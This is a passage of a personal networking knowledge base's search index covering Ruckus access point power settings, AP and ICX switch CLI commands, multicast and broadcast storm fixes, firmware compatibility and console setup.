required\n</code></pre>"},{"location":"Knowledge_Base/Network/Vendor/Ruckus/Access_Points/AP_TX_Power_EIRP_Ruckus_SZ/#the-rule-of-3","title":"The Rule of 3","text":"<p>If you raise the dBm value by \u201c3\u2033 you double the mW value</p> <pre><code>0dBm = 1mW\n3dBm = 2mW\n6dBm = 4mW\n9dBm = 8mW\n12dBm = 16mW\n15dBm = 32mW\n18dBm = 64mW\n21dBm = 128mW\n24dBm = 256mW\n27dBm = 512mW\n30dBm = 1024mW (5GHz Band B legal limit)\n33dBm = 2048mW\n36dBm = 4096mW (5GHz Band C legal limit)\n</code></pre>"},{"location":"Knowledge_Base/Network/Vendor/Ruckus/Access_Points/AP_TX_Power_EIRP_Ruckus_SZ/#the-rule-of-10","title":"The Rule of 10","text":"<p>If you raise the dBm value by \u201c10\u2033 you multiply the mW value by 10:</p> <pre><code>0dBm = 1mW\n10dBm = 10mW\n20dBm = 100mW\n30dBm = 1000mW (5GHz Band B legal limit)\n40dBm = 10000mW (Over the 5GHz Band C legal limit)\n</code></pre>"},{"location":"Knowledge_Base/Network/Vendor/Ruckus/Access_Points/AP_TX_Power_EIRP_Ruckus_SZ/#actual-wap-power-vs-datasheet","title":"Actual WAP Power vs Datasheet","text":"<p>I was working a case about a year ago Channelizing over 100 WAPs at this single location, i had to set the power on each WAP separately based on our ekahau WiFi Survey report, i am not one to do such task from GUI, therefor I scripted the whole thing to run on the SmartZone.</p> <p>Anyway, I found that after settings the power on all WAPs and monitoring the clients, nothing was making sense. I looked into the datasheet for each WAP model we had at this location and tried checking the calculations I made based on the information I was fed by our CWNE Network Architect and still something didn't make sense.</p> <p>I reached out to Ruckus support asking on how I can check the actual Tx Power on the WAP and that's when he hopped on and gave me access to the support shell to get the information I need.</p> <p>This is when I found out that the actual data provided by Ruckus on the Datasheets, doesn't really match what you get from the Access Point, I was kind of shocked. Below are some of the values I obtained while doing my checks on the WAP, you can see what power level you get based on the select settings i had at the time.</p>"},{"location":"Knowledge_Base/Network/Vendor/Ruckus/Access_Points/AP_TX_Power_EIRP_Ruckus_SZ/#h550","title":"H550","text":"<pre><code>2.4GHz Max 17\n5GHz Max 19\n\n2.4GHz -5dB = 11 dBm\n5GHz   -2   = 17 dBm\n</code></pre>"},{"location":"Knowledge_Base/Network/Vendor/Ruckus/Access_Points/AP_TX_Power_EIRP_Ruckus_SZ/#r350","title":"R350","text":"<pre><code>2.4GHz Max 20  2 gain\n5GHz Max 20 gain 3\nMin is Zero\n\n10 -10 2.4Ghz\n14 -6 5Ghz\n</code></pre>"},{"location":"Knowledge_Base/Network/Vendor/Ruckus/Access_Points/AP_TX_Power_EIRP_Ruckus_SZ/#t350c","title":"T350c","text":"<pre><code>2.4Ghz 23dBm\n5Ghz 22dBm\n</code></pre>"},{"location":"Knowledge_Base/Network/Vendor/Ruckus/Access_Points/AP_TX_Power_EIRP_Ruckus_SZ/#t310c","title":"T310c","text":"<pre><code>2.4Ghz 20dBm\n5Ghz 22dBm \n</code></pre> <p>below is an example of what I used to script the WAPs on the SmartZone</p> <pre><code>enable\nconfig\nap 10:F0:68:11:7E:A0\nradio 2.4g channel 6\nradio 2.4 tx-power -6\nradio 5g channel 40\nradio 5g tx-power max\nexit\nyes\n\nap 10:F0:68:11:69:00\nradio 2.4g channel 6\nradio 2.4 tx-power -10\nradio 5g channel 44\nradio 5g tx-power -6\nexit\nyes\n</code></pre> <p>below is an example of turning off overrides on WAP, removing any changes made on WAP level for Tx Power and Channelization</p> <pre><code>config\nap 70:47:77:15:48:90\nno radio 2.4g channelization\nyes\nno radio 5g channelization\nyes\nno radio 2.4g tx-power\nyes\nno radio 5g tx-power\nyes\nend\nyes\n</code></pre>"},{"location":"Knowledge_Base/Network/Vendor/Ruckus/Access_Points/Ruckus_AP_CLI_SZ/","title":"Ruckus AP CLI SZ","text":""},{"location":"Knowledge_Base/Network/Vendor/Ruckus/Access_Points/Ruckus_AP_CLI_SZ/#execute-ap-cli-commands-remotely-from-scg","title":"execute AP CLI commands remotely from SCG","text":"<pre><code>remote ap-cli &lt;AP-MAC-Address&gt; \u201cAP CLI command\u201d\n</code></pre>"},{"location":"Knowledge_Base/Network/Vendor/Ruckus/Access_Points/Ruckus_AP_CLI_SZ/#display-scg-settings","title":"display SCG Settings","text":"<pre><code>get scg\n</code></pre>"},{"location":"Knowledge_Base/Network/Vendor/Ruckus/Access_Points/Ruckus_AP_CLI_SZ/#set-the-ip-address-of-the-control-interface","title":"set the IP Address of the control interface","text":"<pre><code>set scg ip \u201cIP Address\u201d\n</code></pre>"},{"location":"Knowledge_Base/Network/Vendor/Ruckus/Access_Points/Ruckus_AP_CLI_SZ/#show-zonedirector-information","title":"show ZoneDirector information","text":"<pre><code>get director\n</code></pre>"},{"location":"Knowledge_Base/Network/Vendor/Ruckus/Access_Points/Ruckus_AP_CLI_SZ/#set-zonedirector-ip","title":"set ZoneDirector IP","text":"<p>Reboot is required for changes to take effect</p> <pre><code>set director ip \u201cIP Address\u201d\n</code></pre>"},{"location":"Knowledge_Base/Network/Vendor/Ruckus/Access_Points/Ruckus_AP_CLI_SZ/#ping-another-station","title":"ping another station","text":"<pre><code>ping\n</code></pre>"},{"location":"Knowledge_Base/Network/Vendor/Ruckus/Access_Points/Ruckus_AP_CLI_SZ/#traceroute-test","title":"traceroute test","text":"<pre><code>traceroute\n</code></pre>"},{"location":"Knowledge_Base/Network/Vendor/Ruckus/Access_Points/Ruckus_AP_CLI_SZ/#display-the-software-version-running-on-the-ap","title":"display the software version running on the AP","text":"<pre><code>get version\n</code></pre>"},{"location":"Knowledge_Base/Network/Vendor/Ruckus/Access_Points/Ruckus_AP_CLI_SZ/#display-how-long-the-ruckus-wireless-device-has-been-running","title":"display how long the Ruckus Wireless device has been running.","text":"<pre><code>get uptime\n</code></pre>"},{"location":"Knowledge_Base/Network/Vendor/Ruckus/Access_Points/Ruckus_AP_CLI_SZ/#get-cpu-and-memory-utilization-information","title":"get CPU and memory utilization information","text":"<pre><code>sysinfo\n</code></pre>"},{"location":"Knowledge_Base/Network/Vendor/Ruckus/Access_Points/Ruckus_AP_CLI_SZ/#display-ap-operation-mode-standalone-or-managed-mode","title":"display AP operation mode (standalone or managed mode)","text":"<pre><code>get ap-mode\n</code></pre>"},{"location":"Knowledge_Base/Network/Vendor/Ruckus/Access_Points/Ruckus_AP_CLI_SZ/#display-hardware-version-and-system-board-information","title":"display hardware version and system board information","text":"<pre><code>get boarddata\n</code></pre>"},{"location":"Knowledge_Base/Network/Vendor/Ruckus/Access_Points/Ruckus_AP_CLI_SZ/#generate-support-log-information","title":"generate support log information","text":"<pre><code>support\n</code></pre>"},{"location":"Knowledge_Base/Network/Vendor/Ruckus/Access_Points/Ruckus_AP_CLI_SZ/#show-support-log-information","title":"show support log information","text":"<pre><code>support show\n</code></pre>"},{"location":"Knowledge_Base/Network/Vendor/Ruckus/Access_Points/Ruckus_AP_CLI_SZ/#show-all-to-display-firmware","title":"show all to display firmware","text":"<pre><code>fw show all\n</code></pre>"},{"location":"Knowledge_Base/Network/Vendor/Ruckus/Access_Points/Ruckus_AP_CLI_SZ/#display-tunnelmgr-settings","title":"display tunnelmgr settings","text":"<pre><code>get tunnelmgr\n</code></pre>"},{"location":"Knowledge_Base/Network/Vendor/Ruckus/Access_Points/Ruckus_AP_CLI_SZ/#display-all-wlan-interfaces","title":"display all WLAN interfaces","text":"<p>If the AP is a dual radio AP, the RadioID column indicates which radio (2.4GHz or 5GHz) is serving the WLAN.</p> <pre><code>get wlanlist\n</code></pre>"},{"location":"Knowledge_Base/Network/Vendor/Ruckus/Access_Points/Ruckus_AP_CLI_SZ/#list-all-configured-wlan-interfaces-and-security-settings","title":"list all configured wlan interfaces and security settings","text":"<pre><code>get wlaninfo\n</code></pre>"},{"location":"Knowledge_Base/Network/Vendor/Ruckus/Access_Points/Ruckus_AP_CLI_SZ/#display-the-transmit-channel-on-the-device","title":"display the transmit channel on the device","text":"<pre><code>get channel &lt;wlan name&gt;\n</code></pre>"},{"location":"Knowledge_Base/Network/Vendor/Ruckus/Access_Points/Ruckus_AP_CLI_SZ/#display-the-state-of-a-wlan-interface","title":"display the state of a WLAN interface","text":"<pre><code>get state &lt;wlan name&gt;\n</code></pre>"},{"location":"Knowledge_Base/Network/Vendor/Ruckus/Access_Points/Ruckus_AP_CLI_SZ/#configure-the-state-of-a-wlan-interface","title":"configure the state of a WLAN interface","text":"<pre><code>set state &lt;wlan name&gt; {up|down}\n</code></pre>"},{"location":"Knowledge_Base/Network/Vendor/Ruckus/Access_Points/Ruckus_AP_CLI_SZ/#get-station-list-information-and-statistics","title":"get station list, information and statistics","text":"<pre><code>get station &lt;wlan name&gt; list\n</code></pre>"},{"location":"Knowledge_Base/Network/Vendor/Ruckus/Access_Points/Ruckus_AP_CLI_SZ/#display-media-queue-statistics","title":"display Media Queue Statistics","text":"<pre><code>get mqstats &lt;wlan name&gt; all\n</code></pre>"},{"location":"Knowledge_Base/Network/Vendor/Ruckus/Access_Points/Ruckus_AP_CLI_SZ/#display-ap-certificate-information","title":"display AP certificate information","text":"<pre><code>get rpki-cert {issuer|subject|validity}\n</code></pre>"},{"location":"Knowledge_Base/Network/Vendor/Ruckus/Access_Points/Ruckus_AP_CLI_SZ/#restart-the-ap","title":"restart the AP","text":"<pre><code>reboot\n</code></pre>"},{"location":"Knowledge_Base/Network/Vendor/Ruckus/Access_Points/Ruckus_AP_CLI_SZ/#return-all-configuration-settings-to-their-factory-defaults","title":"return all configuration settings to their factory defaults","text":"<pre><code>set factory\n</code></pre>"},{"location":"Knowledge_Base/Network/Vendor/Ruckus/Access_Points/Ruckus_AP_CLI_SZ/#remote-packet-with-wireshark","title":"Remote packet with Wireshark","text":"<pre><code>#This sets up packet capture on 2.4GHz radio\nset capture wlan100 stream\n\n#This displays status of 2.4GHz radio capture\nget capture wlan100 state\n\n#To stop the capture on 2.4GHz radio\nset capture wlan100 idle\n\n#This sets up packet capture on 5GHz radio\nset capture wlan101 stream\n\n#This displays status of 5GHz radio capture\nget capture wlan101 state\n\n#To stop the capture on 5GHz radio\nset capture wlan101 idle\n</code></pre>"},{"location":"Knowledge_Base/Network/Vendor/Ruckus/Access_Points/Ruckus_Access_Point_compatibility_-_ZoneDirector_ZD_SmartZone_SZ_Firmware/","title":"Ruckus Access Point compatibility - ZoneDirector ZD SmartZone SZ Firmware","text":"<p>** AP Firmware compatibility to Join ZD **</p> <p>ZD firmware version 9.13.x or lower &gt; AP with Standalone Firmware 100.x is supported. ZD firmware version 10.x or later   &gt; AP with Standalone Firmware 104.x or above is supported.</p> <p>AP utilizes SSH to communicate with the controller</p> <ul> <li>APs running Solo 110.X and above</li> <li>APs running SZ 5.x and above</li> <li>APs running Unleashed 200.x and newer</li> </ul> <p>AP utilizes <code>LWAPP</code> to communicate with the controller</p> <ul> <li>APs running ZD 9.x</li> <li>APs running solo 104.x or prior</li> </ul> <p>++++++++++</p> <p>In SmartZone under <code>Cluster Information</code> &gt; Only first time config you can enable the AP Conversion (This enables <code>LWAPP</code>) &gt; if not enabled then, you can re-enable it from GUI, you have to go to CLI You can enable this option or disable it through CLI when onboarding APs depending on compatibility</p> <pre><code>&gt;enable\n&gt;Show run lwapp2scg\n</code></pre> <p>check the policy if deny all or allow all</p> <pre><code>#config\n#lwapp2scg\n#policy accept-all          &gt;  choose this depending on what you need \n#policy deny-all            &gt;  choose this depending on what you need\n#end\n</code></pre> <p>It is similar for vSZ/SZ, so for SZ/vSZ lower than 3.6.x, the AP standalone firmware 100.x is supported and for the firmware version higher than 5.x, the AP firmware version 104.x or higher is supported.</p> <p>IP mode on dual mode AP solo 114 latest .6565 and avoid .1360 will have issue 5.1 or 5.2 SZ So you need to have only IPv4</p> <p>Latest APs should be on 114 but older try either 104 or 110 solo Firmware version</p> <p>on AP having issue with run <code>get syslog log</code></p> <pre><code>#set Controller IP\nset scg ip\n</code></pre> <p>ping controller also if needed to check if you can reach it out</p> <p>Controller upgrade then you need to upgrade the APs</p>"},{"location":"Knowledge_Base/Network/Vendor/Ruckus/Access_Points/Ruckus_ICX_Brocade_CLI_Dot1x_Ruckus_MAC_Authentication_Security_Port/","title":"Ruckus ICX Brocade CLI Dot1x Ruckus MAC Authentication Security Port","text":"<p>fastiron-08060-securityguide</p> <pre><code>conf t\nauthentication\nno mac-authentication enable ethernet 1/1/X\nexit\nno dot1x enable ethernet 1/1/X\nwr mem\n</code></pre> <p>Check <code>Show run</code>, now you can untag VLAN to Port.</p>"},{"location":"Knowledge_Base/Network/Vendor/Ruckus/Switches/Brocade_ICX_Broadcast_and_Multicast/","title":"Brocade ICX Broadcast and Multicast","text":""},{"location":"Knowledge_Base/Network/Vendor/Ruckus/Switches/Brocade_ICX_Broadcast_and_Multicast/#how-to-deal-with-broadcast-storms","title":"How to deal with Broadcast Storms","text":"<pre><code>conf t\nint eth 1/1/x to 1/1/x\nloop-detection\nspanning-tree\nstp-bpdu-guard\nstp-protect\n\nclear statistics\nwr mem\n\nshow loop-detection status\nshow span\nshow stp-bpdu-guard\nshow stp-protect-ports\nshow statistics\nshow int | i cast\n</code></pre>"},{"location":"Knowledge_Base/Network/Vendor/Ruckus/Switches/Brocade_ICX_Broadcast_and_Multicast/#multicast-igmp","title":"Multicast (IGMP)","text":""},{"location":"Knowledge_Base/Network/Vendor/Ruckus/Switches/Brocade_ICX_Broadcast_and_Multicast/#summary","title":"Summary","text":"<p>When a device processes a multicast packet, by default, it broadcasts the packets to all ports except the incoming port of a VLAN. Packets are flooded by hardware without going to the CPU. This behavior causes some clients to receive unwanted traffic.</p> <p>IGMP snooping provides multicast containment by forwarding traffic to only the ports that have IGMP receivers for a specific multicast group (destination address). A device maintains the IGMP group membership information by processing the IGMP reports and leave messages, so traffic can be forwarded to ports receiving IGMP reports. An IPv4 multicast address is a destination address in the range of 224.0.0.0 to 239.255.255.255. Addresses of 224.0.0.X are reserved.</p> <p>If a VLAN is not IGMP snooping-enabled, it floods multicast data and control packets to the entire VLAN in hardware. When snooping is enabled, IGMP packets are trapped to the CPU. Data packets are mirrored to the CPU in addition to being VLAN flooded. The CPU then installs hardware resources, so that subsequent data packets can be switched to desired ports in hardware without going to the CPU. If there is no client report or port to queriers for a data stream, the hardware resource drops it.</p>"},{"location":"Knowledge_Base/Network/Vendor/Ruckus/Switches/Brocade_ICX_Broadcast_and_Multicast/#igmp-modes","title":"IGMP modes","text":"<p>The default mode is passive. Below are the 2 IGMP modes</p> <ul> <li>Active   actively sends out IGMP queries to identify multicast groups on the network, and makes entries in the IGMP table based on the group membership reports it receives.</li> <li>Passive    it forwards reports to the router ports which receive queries. IGMP snooping in the passive mode does not send queries. However, it forwards queries to the entire VLAN.</li> </ul>"},{"location":"Knowledge_Base/Network/Vendor/Ruckus/Switches/Brocade_ICX_Broadcast_and_Multicast/#the-commands","title":"The commands","text":"<pre><code>#To globally set the IGMP mode\ndevice(config)#ip multicast active\n\n#To set the IGMP mode for VLAN 20, enter the following commands.\ndevice(config)#vlan 20\ndevice(config-vlan-20)#multicast active\n\n#You can set the IGMP version this way, same syntax if IGMP over VLAN\ndevice(config)#ip multicast version 3\nSyntax: [no] ip multicast version [2 | 3]\n#If you do not specify a version number, IGMP V2 is assumed.\n\n#multicast reporting\nip multicast report-control\n\n#displaying the IGMP snooping configuration\nsh ip multicast\n\n#display information about IGMP groups\nsh ip multicast group\n\n#displaying the status of IGMP snooping traffic\nsh ip multicast traffic\n\n#displaying a list of multicast groups\nsh ip pim group\n\n#displaying PIM mcache table entries\nsh ip pim mcache\n\n#disables flooding of unregistered IPv4 multicast frames in an IGMP-snooping-enabled VLAN\nip multicast disable-flooding\n</code></pre>"},{"location":"Knowledge_Base/Network/Vendor/Ruckus/Switches/Brocade_ICX_Broadcast_and_Multicast/#multicast-pvlan","title":"Multicast (pvlan)","text":"<p>Primary VLANs. pvlan type command specifies that this port-based VLAN is a PVLAN and can be of the following types:</p> <ul> <li>community: Broadcasts and unknown unicasts received on community ports are sent to the primary port and also are flooded to the other ports in the community VLAN.</li> <li>Primary: Broadcasts and unknown unicasts received on Primary ports are sent only to the primary port. They are not flooded to other ports in the Primary VLAN.</li> <li>primary: The primary PVLAN ports are \"promiscuous\". They can communicate with all the Primary PVLAN ports and community PVLAN ports in the Primary and community VLANs that are mapped to the promiscuous port.</li> </ul> <p>When setting pvlan type on VLAN you might get an error stating protected port</p> <pre><code>(config-vlan-800)#pvlan type Primary\nError: Protected ports can't be added to private vlans\n</code></pre> <p>In case you got above error, you will need to disable protected port on any interfaces you have it set on, then you can set the type of isolation on the VLAN</p> <pre><code>#example of removing protected-port from ports 1-14\n(config-mif-1/1/1-1/1/14)#no protected-port\n\n#navigate to your vlan, in this case we have vlan 800\n(config-mif-1/1/1-1/1/14)#vlan 800\n\n#before making the change, lets have a reference point to compare with\n(config-vlan-800)#show int | i cast\n\n#make the change to the pvlan type desired\n(config-vlan-800)#pvlan type Primary\n#You can ignore the below messages\n#Warning: Primary Port 1/1/1 is member of Regular VLANs 300  \n#Warning: Primary Port 1/1/2 is member of Regular VLANs 300  \n\n(config-vlan-800)#wr mem\n(config-vlan-800)#clear statistics\n\n#wait a few minutes and then see how many multicast you are seeing now, keep running the command every few minutes and it should have a stable increment value (nothing crazy)\n(config-vlan-800)#show int | i cast\n</code></pre> <p>This should take care of multicast storm issues, of course you will need to issue <code>clear statistics</code> command after each change and monitor if the changes are actually working or not</p> <p></p> <p>After the change</p> <p></p> <p>You can also try Limiting multicast, but I do not recommend this.</p> <pre><code>#limit multicast Pkts/sec\nmulticast limit 10000\n</code></pre>"},{"location":"Knowledge_Base/Network/Vendor/Ruckus/Switches/Brocade_ICX_Broadcast_and_Multicast/#access-point-multicast-disable","title":"Access Point Multicast disable","text":"<p>If you're having IPTV issues while STB plugged into an Access Point port, you can disable the Multicast on the AP itself, this could solve the issue.</p> <pre><code>#check qos configuration on a specific port\nget qos eth4\n\n#disabling the multicast per AP port, you will have to check how many ports your AP has\nset qos eth0 directed multicast disable\nset qos eth1 directed multicast disable\nset qos eth2 directed multicast disable\nset qos eth3 directed multicast disable\nset qos eth4 directed multicast disable\n</code></pre>"},{"location":"Knowledge_Base/Network/Vendor/Ruckus/Switches/Brocade_ICX_Broadcast_and_Multicast/#ipv4-acls","title":"IPv4 ACLs","text":""},{"location":"Knowledge_Base/Network/Vendor/Ruckus/Switches/Brocade_ICX_Broadcast_and_Multicast/#method-1","title":"Method 1","text":"<p>IPv4 ACLs that filter based on VLAN membership or VE port membership (Router image only) You cannot change VLAN membership on a port while per-port-per-vlan is enabled</p> <pre><code>#in global config run the below and then reload the switch\nenable acl-per-port-per-vlan\nwr mem\nexit\nreload\n\n#do this on all ports EXCEPT the UPLINK PORT\nint eth 1/1/x to 1/1/x\nloop-detection shutdown-disable\n\nint eth 1/1/x to 1/1/x\nsource-guard enable\nwr mem\n</code></pre>"},{"location":"Knowledge_Base/Network/Vendor/Ruckus/Switches/Brocade_ICX_Broadcast_and_Multicast/#method-2-preferable","title":"Method 2 (Preferable)","text":"<p>Create an ACL and assign it</p> <p>You will need to know what ports are being utilized by the vendor, depending if this is an STB (Set Top Boxes), Chromecast, etc...</p> Port(s) Protocol Service 5353 tcp,udp Multicast DNS (MDNS) 5353 udp Bonjour 1900 tcp,udp SSDP, UPnP (Universal PnP) <p>Below ACL will block ports 1900 &amp; 5353</p> <pre><code>#Not for Chromcasts - Only STBS\n#if you have Chromcasts you cant do any any, you have to put the the IP you need to isolate\nip access-list extended Filter_mDNS\nsequence 10 deny udp any any eq 5353\nsequence 20 deny udp any any eq 1900\nsequence 30 permit ip any any\n</code></pre> <p>Below is how you apply the ACL above to a Router ve for a specific VLAN</p> <pre><code>#configure the Filter on Interface ve level\ninterface ve &lt;ve_Number&gt;\nip access-group Filter_mDNS in\n</code></pre>"},{"location":"Knowledge_Base/Network/Vendor/Ruckus/Switches/Brocade_ICX_Broadcast_and_Multicast/#assign-the-list-to-a-port","title":"assign the list to a port","text":"<pre><code>interface ethernet 1/1/14\nip access-group Filter_mDNS in\n</code></pre> <p>Additional setup</p> <pre><code>vlan 10\nspanning-tree\nloop-detection\nwr mem\nspanning-tree\nwr mem\n</code></pre>"},{"location":"Knowledge_Base/Network/Vendor/Ruckus/Switches/Brocade_ICX_Switch_Configuration_CLI_flash_SPR_SPS/","title":"Brocade ICX Switch Configuration CLI flash SPR SPS","text":"<pre><code>ICX7150-C12 Switch&gt;show flash\n\nStack unit 1:\n  NAND Type: Micron NAND 2GiB (x 1)\n  Compressed Pri Code size = 31457280, Version:08.0.95kT211 (SPS08095k.bin)\n  Compressed Sec Code size = 33554432, Version:08.0.95kT213 (SPR08095k.bin)\n  Compressed Pri Boot Code size = 786944, Version:10.1.26T225 (mnz10126)\n  Compressed Sec Boot Code size = 786944, Version:10.1.26T225 (mnz10126)\n  Code Flash Free Space = 1052270592\n</code></pre> <pre><code>ICX7150-C12 Switch&gt;show version\n\n  Copyright (c) Ruckus Networks, Inc. All rights reserved.\n    UNIT 1: compiled on Jun  9 2023 at 06:14:36 labeled as SPS08095k\n      (31457280 bytes) from Primary SPS08095k.bin (UFI)\n        SW: Version 08.0.95kT211\n      Compressed Primary Boot Code size = 786944, Version:10.1.26T225 (mnz10126)\n      Compiled on Tue Nov 29 12:43:26 2022\n\n  HW: Stackable ICX7150-C12-POE\n==========================================================================\nUNIT 1: SL 1: ICX7150-C12-2X10GR POE 12-port Management Module\n      Serial  #:ABCDE32U01M\n      Software Package: BASE_SOFT_PACKAGE\n      Current License: 2X10GR\n      P-ASIC  0: type B160, rev 11  Chip BCM56160_B0\n==========================================================================\nUNIT 1: SL 2: ICX7150-2X1GC 2-port 2G Module\n==========================================================================\nUNIT 1: SL 3: ICX7150-2X10GF 2-port 20G Module\n==========================================================================\n1000 MHz ARM processor ARMv7 88 MHz bus\n    8 MB boot flash memory\n    2 GB code flash memory\n    1 GB DRAM\nSTACKID 1  system uptime is 1 day(s) 9 hour(s) 3 minute(s) 19 second(s)\nThe system started at 06:14:38 GMT+00 Fri Jun 09 2023\n</code></pre> <pre><code>ICX7150-C12 Switch&gt;enable\n\nNo password has been assigned yet...\n</code></pre> <pre><code>ICX7150-C12 Switch#boot system flash secondary\n\nAre you sure? (enter 'y' or 'n'): y\nCould not verify if the Running Config data has been changed.\nDo you want to continue the reload anyway? (enter 'y' or 'n'): y\n</code></pre> <pre><code>ICX7150-C12 Router#copy flash flash primary\n\nFlash Memory Write (8192 bytes per dot)\nICX7150-C12 Router#................\nProcessing the bundle image...\nFlashing application image to Primary partition...\n\nSYNCING IMAGE TO FLASH. DO NOT SWITCH OVER OR POWER DOWN THE UNIT(65536 bytes per dot)...\n\nFlashing bootrom image to Primary partition...\n\nSYNCING IMAGE TO FLASH. DO NOT SWITCH OVER OR POWER DOWN THE UNIT(65536 bytes per dot)...\n............\nPost processing bundle image...\nBundle image processed successfully\n\nCopy Done\n</code></pre> <pre><code>ICX7150-C12 Router#reload\nICX7150-C12 Router#y\nICX7150-C12 Router#y\n</code></pre> <pre><code>CLI&gt;enable\nCLI&gt;show flash\n</code></pre>"},{"location":"Knowledge_Base/Network/Vendor/Ruckus/Switches/Console_Settings_Ruckus_Brocade_ICX/","title":"Console Settings Ruckus Brocade ICX","text":"<p>When the terminal emulator application stops reporting information, press Enter to display the device prompt.</p> <p>Depending on the device you purchased, and the code (Layer 2 or Layer 3) loaded on your system, the device prompt is displayed accordingly.</p> <pre><code>device&gt;\n</code></pre> <p>When the device prompt is displayed, you are connected to the device. You can customize the prompt by changing the device name. If you do not see this prompt, make sure the cable is securely connected to your workstation and to the device and check the settings in your terminal emulation program. In addition to the previously configured session settings, make sure the terminal emulation session is running on the same serial port you attached to the device.</p> <p>The device CLI prompt has the following access levels:</p> <ul> <li>User EXEC: This is the level you enter when you first start a CLI session. At this level, you can view some system information but you cannot configure system or port parameters.</li> <li>Privileged EXEC: This level is also called the Enable level and can be secured by a password. You can perform tasks such as managing files on the flash module, saving the system configuration to flash, and clearing caches at this level.</li> <li>CONFIG: The configuration level. This level allows you to configure the system IP address and configure switching and routing features. To access the CONFIG mode, you must already be logged in to the privileged EXEC level.</li> </ul>"},{"location":"Knowledge_Base/Network/Vendor/Ruckus/Switches/Console_Settings_Ruckus_Brocade_ICX/#connecting-to-the-console","title":"Connecting to the Console","text":"<p>There are two ways to connect to the configuration console of a new Ruckus ICX switch: either with a Telnet/SSH session over an IP network or directly through the serial interface.</p>"},{"location":"Knowledge_Base/Network/Vendor/Ruckus/Switches/Console_Settings_Ruckus_Brocade_ICX/#telnet-or-ssh","title":"Telnet or SSH","text":"<p>If a Ruckus ICX switch is connected to a network, it will automatically issue DHCP requests for an IP configuration, which will be provided by a DHCP server. Identifying the IP address that has been assigned to the switch can be done by viewing the address assignment list on the DHCP server or by the switch serial interface (using the <code>show ip command</code>)</p> <p>Once the IP address of the switch is known, a Telnet or SSH session can be established using a terminal emulation program.</p> <p>Note</p> <p>The ICX7150-24F, ICX7150-C08P, and ICX7150-C10ZP switches ship from the factory with SSH enabled and Telnet disabled. All other switches have Telnet enabled only.</p>"},{"location":"Knowledge_Base/Network/Vendor/Ruckus/Switches/Console_Settings_Ruckus_Brocade_ICX/#ruckus-icx-7150-and-ruckus-icx-7650-serial-connection","title":"Ruckus ICX 7150 and Ruckus ICX 7650 (Serial connection)","text":"<p>The Ruckus ICX 7150 presents a USB Type-C connection, which can be connected directly to the USB port on a PC using a standard USB cable. Any standard USB Type-C\u2013to\u2013Type-A cable can be used; if you wish to purchase the cable from Ruckus, the part number is CC-USBC-USBA.</p> <p>The Ruckus ICX 7150 and ICX 7650 switches also present a standard serial interface through an RJ45 connector. An RJ45-to-DB9F cable is included with each switch and, if required, additional cables can be ordered from Ruckus using part number CC-RJ45-DB9, which is comprised of the following two parts: - RJ45 to RJ45: Part number 50-1000117-01 - RJ45 to DB9F: Part number 50-0000112-01</p> <p></p> <p>Sources - ICX7150</p>"},{"location":"Knowledge_Base/Network/Vendor/Ruckus/Switches/Console_Settings_Ruckus_Brocade_ICX/#ruckus-icx-7250-and-ruckus-icx-7450-serial-connection","title":"Ruckus ICX 7250 and Ruckus ICX 7450 (Serial connection)","text":"<p>The Ruckus ICX 7250 and ICX 7450 switches present their serial interface through a mini-USB type connector, and every switch is shipped with a serial cable that terminates on both RJ45 and DB9 connections. The following two parts ship with every switch: - Mini-USB to RJ45: Part number 50-1000122-01 - RJ45 to DB9F: Part number 50-0000112-01</p> <p>If required, these two parts can be ordered using part number CC-miniusb-RJ45</p> <p>To connect a PC to the serial interface, a DB9M-to-USB adapter is required; this adapter can be obtained from an online electronics supplier.</p> <p>Figure 1. DB9M-to-USB Adapter! </p> <p>Once a serial connection to the switch has been made, a terminal emulation program can be used to access the CLI.</p>"},{"location":"Knowledge_Base/Network/Vendor/Ruckus/Switches/Console_Settings_Ruckus_Brocade_ICX/#establishing-a-first-time-connection-to-the-console-port","title":"Establishing a first-time connection to the console port","text":"<p>You can use either the USB Type-C console port or the RJ-45 serial console port to establish the first time connection to the device. The console port allows you to configure and manage the device using a third-party terminal emulation application from a workstation that is directly connected to the port using a standard USB Type-C cable or RJ-45 serial cable. Perform the following steps to log in to the device for the first time through the console connection.</p>"},{"location":"Knowledge_Base/Network/Vendor/Ruckus/Switches/Console_Settings_Ruckus_Brocade_ICX/#do-one-of-the-following-based-on-the-switch-model-and-connector-type","title":"Do one of the following based on the Switch model and connector type","text":"<ul> <li>Connect a standard USB cable to the USB Type-C console connector on the device and to a USB port on the workstation. To connect the USB Type-C console port on the device to a USB port on the workstation, you need a standard USB cable that has a USB Type-C connector on one end and a USB connector on the other end that matches the USB port on your workstation.</li> <li> <p>Connect a standard RJ-45 cable to the RJ-45 serial console connector on the device and to a USB port on the workstation. To connect the RJ-45 serial console port on the device to a USB port on the workstation, you need a standard RJ-45 cable that has an RJ-45 connector on one end and a USB connector on the other end that matches the USB port on your workstation.</p> </li> <li> <p>Allow the workstation to automatically discover and configure the newly found USB device.</p> </li> </ul> <p>Note</p> <p>If the workstation is unable to automatically discover and configure the newly found USB device, you can manually download the necessary device drivers for Windows, MacOS, and Linux from the following website: Ruckus Drivers</p> <p>Ruckus 7150 USB Serial driver Windows - CP210x_Windows_Drivers.zip</p>"},{"location":"Knowledge_Base/Network/Vendor/Ruckus/Switches/Console_Settings_Ruckus_Brocade_ICX/#open-a-terminal-emulator","title":"Open a terminal emulator","text":"<p>configure the sessions parameters as follows:</p> <ul> <li>In a Windows environment, use the following values:</li> </ul> Parameter Value Baud: Bits per second 9600 Data bits 8 Parity None Stop bits 1 Flow control None <p>Note</p> <p>Flow control is not supported on the console connection when attached to a remote terminal and must be disabled on the customer-side remote terminal server in addition to the host-side clients. - In a UNIX environment using TIP, enter the following string at the prompt: <code>tip /dev/ttyb -9600</code> - If <code>ttyb</code> is already in use, use <code>ttya</code> instead and enter the following string at the prompt: <code>tip /dev/ttya -9600</code></p>"},{"location":"Knowledge_Base/Network/Vendor/Ruckus/Switches/Console_Settings_Ruckus_Brocade_ICX/#privileged-exec-mode","title":"privileged EXEC mode","text":"<p>At the opening device CLI prompt, enter the following command to change to the privileged EXEC mode:</p> <pre><code>device&gt; enable\ndevice#\u00a0\n</code></pre> <p>By default, the CLI is not protected by passwords. To secure CLI access, RUCKUS strongly recommends assigning passwords. You can set the following levels of passwords:</p> <ul> <li>Super User: Allows complete read-and-write access to the system. This is generally for system administrators and is the only password level that allows you to configure other passwords.</li> </ul> <p>Note</p> <p>You must set a Super User password before you can set other types of passwords. You can also assign other passwords using Brocade Network Advisor after an enable password has been configured for a Super User on the device using the CLI.</p> <ul> <li>Port Configuration: Allows read-and-write access to specific ports but not 